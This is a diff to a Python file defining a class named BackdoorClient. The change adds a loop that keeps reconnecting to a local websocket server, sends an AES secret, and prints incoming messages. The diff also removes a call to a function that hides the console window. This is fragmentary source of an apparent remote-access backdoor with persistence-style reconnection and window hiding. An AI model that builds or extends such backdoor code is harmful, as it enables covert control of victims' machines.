@@ -6,8 +6,8 @@ import threading
 import chardet
 import uuid
 import json
-from base64 import b64decode
-from base64 import b64encode
+import time
+from base64 import b64decode, b64encode
 from websocket import create_connection
 from Crypto.Cipher import AES
 __author__ = 'nekocode'
@@ -25,16 +25,25 @@ class BackdoorClient(threading.Thread):
         self.start()
 
     def run(self):
-        ws = create_connection("ws://localhost:8888/")
-
-        sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
-        ws.send(json.dumps(sercret_msg))
-
         while True:
-            result = ws.recv()
-            print result
+            ws = None
+            try:
+                ws = create_connection("ws://localhost:8888/")
 
-        ws.close()
+                sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
+                ws.send(json.dumps(sercret_msg))
+
+                while True:
+                    result = ws.recv()
+                    print result
+
+                ws.close()
+
+            except Exception as e:
+                if ws:
+                    ws.close()
+                time.sleep(5)
+
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -64,7 +73,9 @@ def hide_cmd_window():
         ctypes.windll.kernel32.CloseHandle(whnd)
 
 if __name__ == '__main__':
-    hide_cmd_window()
     BackdoorClient()
+    while True:
+        time.sleep(10)
+
 
 
